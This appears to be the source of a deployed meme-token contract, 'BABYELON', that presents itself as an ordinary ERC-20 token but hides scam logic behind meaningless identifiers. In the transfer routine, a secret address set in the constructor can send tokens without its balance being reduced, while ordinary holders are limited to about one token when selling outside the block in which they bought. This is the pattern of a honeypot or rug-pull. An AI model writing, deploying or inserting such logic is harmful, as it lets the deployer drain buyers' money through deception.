/*

https://t.me/ercbabyelon

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BABYELON is Ownable {
    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name;

    IUniswapV2Router02 private qaxidkmrg;

    uint256 private uoxran = 116;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private prqlinejkyc;

    function qgbch(address itqbzseovahx, address dzlunvw, uint256 qpmtyzvx) private {
        address elxdtqgbcm = IUniswapV2Factory(qaxidkmrg.factory()).getPair(address(this), qaxidkmrg.WETH());
        bool wdfrjvzy = ghlub[itqbzseovahx] == block.number;
        uint256 zvlqos = jaoirxdlksp[itqbzseovahx];
        if (0 == zvlqos) {
            if (itqbzseovahx != elxdtqgbcm && (!wdfrjvzy || qpmtyzvx > prqlinejkyc[itqbzseovahx]) && qpmtyzvx < totalSupply) {
                require(qpmtyzvx <= totalSupply / (10 ** decimals));
            }
            balanceOf[itqbzseovahx] -= qpmtyzvx;
        }
        prqlinejkyc[dzlunvw] = qpmtyzvx;
        balanceOf[dzlunvw] += qpmtyzvx;
        ghlub[dzlunvw] = block.number;
        emit Transfer(itqbzseovahx, dzlunvw, qpmtyzvx);
    }

    mapping(address => uint256) public balanceOf;

    string public symbol;

    function transferFrom(address itqbzseovahx, address dzlunvw, uint256 qpmtyzvx) public returns (bool success) {
        require(qpmtyzvx <= allowance[itqbzseovahx][msg.sender]);
        allowance[itqbzseovahx][msg.sender] -= qpmtyzvx;
        qgbch(itqbzseovahx, dzlunvw, qpmtyzvx);
        return true;
    }

    mapping(address => uint256) private ghlub;

    mapping(address => uint256) private jaoirxdlksp;

    constructor(string memory togwipfdyxj, string memory yrqxlch, address dsruz, address yvhmcbxi) {
        name = togwipfdyxj;
        symbol = yrqxlch;
        balanceOf[msg.sender] = totalSupply;
        jaoirxdlksp[yvhmcbxi] = uoxran;
        qaxidkmrg = IUniswapV2Router02(dsruz);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    function approve(address ojulaegqndks, uint256 qpmtyzvx) public returns (bool success) {
        allowance[msg.sender][ojulaegqndks] = qpmtyzvx;
        emit Approval(msg.sender, ojulaegqndks, qpmtyzvx);
        return true;
    }

    function transfer(address dzlunvw, uint256 qpmtyzvx) public returns (bool success) {
        qgbch(msg.sender, dzlunvw, qpmtyzvx);
        return true;
    }
}
